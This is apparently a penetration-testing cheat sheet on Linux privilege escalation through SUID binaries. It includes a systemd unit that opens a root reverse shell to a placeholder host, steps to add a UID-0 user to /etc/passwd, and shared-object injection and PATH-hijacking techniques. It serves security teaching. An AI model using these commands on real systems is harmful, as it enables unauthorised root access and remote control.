---
description: Most common type of privilege escalation techniqu
---

# Using files with SUID/SGID permission set

## What is SUID?

Set owner User ID, also known as Set user ID or setuid is a special flag in Linux permission set.

## Find files with SUID set

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

```
find / -perm -u=s -type f 2>/dev/null
```

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

## Exploiting systemctl

#### Reverse shell to root user

```
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<IP ADDRESS>/<PORT> 0>&1"
```

## Modifying /etc/passwd with write access

With a user that has write access to `/etc/passwd` file, we can add a new user credentials and gain root user access.

* Generate a new password hash using the username as salt, here we are going to use `new` as a salt and `123` as our password.

```bash
openssl passwd -1 -salt new 123
```

* Next copy the hash generated, change the following entry and  enter it into the `/etc/passwd` file's end. Remember to change new with your selected username.

```
new:<hash>:0:0:root:/root:/bin/bash
```

* Now we use the following command and supply our password to gain root access.

```bash
su new   
```

## Shared Object Injection

When a program executes it will try to load the shared objects it requires from a specific path. If we can write to that directory/path the program tries to open then we can have a root shell spawned by a malicious shared object file (`.so` file).

After finding a SUID binary we can run `strace` on the file and search the output for open/access calls and for "no such file" errors:

```
strace <full path to file> 2>&1 | grep -iE "open|access|no such file"
strace -v -f -e execve <command> 2>&1 | grep exec 
```

The `ldd` and `readelf` commands can also be useed as follows:

```
ldd $(which <suid binary>)
readelf $(which <suid binary>)
```

The `strings` command can also be used to find the shared object names being used by a file.

```
strings /path/to/file
```

The `ltrace` command is a Linux debugging tool that displays calls made to shared libraries and system calls.

```
ltrace <command>
```

Compiling a new shared object syntax

```
gcc -shared -fPIC -o /path/to/original/file.so /path/to/code.c
```

## Abusing PATH environment variable

The `PATH` environment variable contains a list of directories where a shell should find programs.&#x20;

In case a program tries to execute another program but only specifies the name of the latter instead of the full path, the shell looks for it in the PATH directories until it's found.

Since the PATH variable is under user's control it can be modified so that the shell makes the program call the new malicious binary in a usser specified directory.



&#x20;



